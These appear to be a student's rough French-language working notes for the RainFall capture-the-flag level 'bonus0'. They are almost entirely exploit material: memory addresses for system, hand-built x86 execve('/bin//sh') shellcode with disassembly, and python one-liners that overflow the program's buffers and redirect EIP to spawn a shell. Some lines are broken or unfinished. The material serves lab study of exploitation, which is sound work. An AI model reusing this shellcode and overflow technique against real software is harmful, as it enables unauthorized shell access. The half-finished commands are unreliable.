system addresse = 0xb7e6b060 = \x60\xb0\xe6\xb7
 + offset = 0xb7e6b060 + 0x40000701 =  0xF7E6B761 = \x61\xb7\xe6\xf7

\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x60\xb0\xe6\xb7\xc9\xc3

strcat = 0x8048390 sans offset



(python -c "print('\x\x\x\x' + 'a'*4092)"; echo $(echo "\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x61\xb7\xe6\xf7\xc9\xc3")) | ./bonus0

(python -c "print('a'*409)"; echo $(python -c "print ('a'*96 + '\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x61\xb7\xe6\xf7\xc9\xc3')")) | ./bonus0


x50
put add	= 0x80484bd

(echo "test un truc la on est pas des putes"; echo $(printf "oui 012345678901234567890123456789\xbd\x84\x04\x08")) | ./bonus0


# random merde 4095 pour remplir le buffer (segfault a 4096) 
# \n pour mettre la 2eme chaine de caractere
python -c "print('a'*4095 + '\n' + 'test')" | ./bonus0

echo "test un truc la on \n est pas des putes"


Symbol "system" is at 0xb7e6b060 in a file compiled without debugging.

0xb7e6b060 = \x60\xb0\xe60\xb7 - 0x77d8595f = F7F50761 = \x61\x07\xf5\xf7

python -c "print('a'*4095 + '\n' + '\x61\x07\xf5\xf7')" | ./bonus0

# 2eme chaine segfault a > 16 octets 

python -c "print('a'*4095 + '\n' + 'a'*12 + '\x61\x07\xf5\xf7')" | ./bonus0



#function call sh
\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x29\xc0\xd3\xaf\xc9\xc3

python -c "print('a'*20 + '\n' + 'a'*(4969 - 21) + )" | ./bonus0


\x26\xf7\xff\xbf debut de notre chaine de caractere


https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ # creation d'un autre shellcode
https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html
https://defuse.ca/online-x86-assembler.htm#disassembly2

'\x68\x73\x2f\x2f\x6e\x69\x62\x2f'  = /bin//sh in reverse order 
or can write : '\x68' + '//sh' + '\x68' + '/bin' (68 for push)
(on ecrit dans la stack pour use le moins de carac possible)


"\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
'\x6a\x0b\x58\x31\xf6\x56\x68' + '//sh' + '\x68' + '/bin' +'\x89\xe3\x31\xc9\x89\xca\xcd\x80'


0:  6a 0b                   push   0xb
2:  58                      pop    eax
3:  31 f6                   xor    esi,esi
5:  56                      push   esi
6:  68 2f 2f 73 68          push   0x68732f2f
b:  68 2f 62 69 6e          push   0x6e69622f
10: 89 e3                   mov    ebx,esp
12: 31 c9                   xor    ecx,ecx
14: 89 ca                   mov    edx,ecx
16: cd 80                   int    0x80 

eip need to go = 0xBffff726 = \x26\xf7\xff\xbf


bonus0@RainFall:~$ ((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9' + '\x16' + '\x89\xca\xcd\x80' + 't' * 5 + '\x26\xf7\xff\xbf' + 'c' * 20)"); cat) | ./bonus0
((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9')"); (python -c "print('\x89\xca\xcd\x80' + 't' * 5 + '\x26\xf7\xff\xbf' + 'c' * 20)"); cat) | ./bonus0

On ecrit notre shellcode dans le buffer qui ne se reset pas, 20 octets pour la premiere chaine (ne pas mettre de /n ou de 0) puis les 4 premier octets de la seconde pour finir notre shellcode, on ajoute 5 octets random pour acceder a l adresse de eip (next instruction de la stack) pour pouvoir jmp au debut de notre shellcode puis x random caractere pour que notre seconde chaine fasse au minimum 20 caracteres (x > 6 pour faire au minimum 20 caracteres && x < (buffermax = 4096 - le nombre deja ecrit))


((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9')"); (python -c "print('\x89\xca\xcd\x80' + 't' * 5 + '\xbf\xff\xf7\x26'[::-1] + 'c' * 20)"); cat) | ./bonus0